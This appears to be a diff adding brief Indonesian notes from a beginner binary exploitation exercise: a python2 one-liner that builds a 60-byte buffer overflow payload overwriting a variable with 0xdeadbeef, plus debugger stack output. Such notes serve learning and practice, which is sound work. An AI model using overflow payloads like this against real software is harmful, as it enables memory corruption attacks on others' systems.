@@ -1,0 +1,9 @@
+payload --> python2 -c "'A'*60+'\xef\xbe\xad\xde'"
+nilai yg diinginkan --> 0xdeadbeef
+feebdaed
+RSP 0000| 0x7fffffffdfd0 --> 0x1
+0008| 0x7fffffffdfd8 --> 0x40067d (<__libc_csu_init+77>:        add    rbx,0x1)
+0016| 0x7fffffffdfe0 --> 0x0
+0024| 0x7fffffffdfe8 --> 0x0
+RDB 0032| 0x7fffffffdff0 --> 0x400630
+
